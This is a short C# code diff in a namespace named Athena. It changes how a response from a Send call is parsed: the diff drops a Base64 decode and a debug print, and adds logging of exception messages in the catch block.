@@ -149,15 +149,15 @@ namespace Athena
             try
             {
                 var responseString = Send(prr).Result;
-                Console.WriteLine("Response: " + Misc.Base64Decode(responseString).Substring(36));
-                PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(Misc.Base64Decode(responseString));
+                PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(responseString);
                 if (cs.responses.Count < 1 || cs.responses[0].status != "success")
                 {
                     return false;
                 }
             }
-            catch
+            catch (Exception e)
             {
+                Console.WriteLine(e.Message);
                 return false;
             }
 
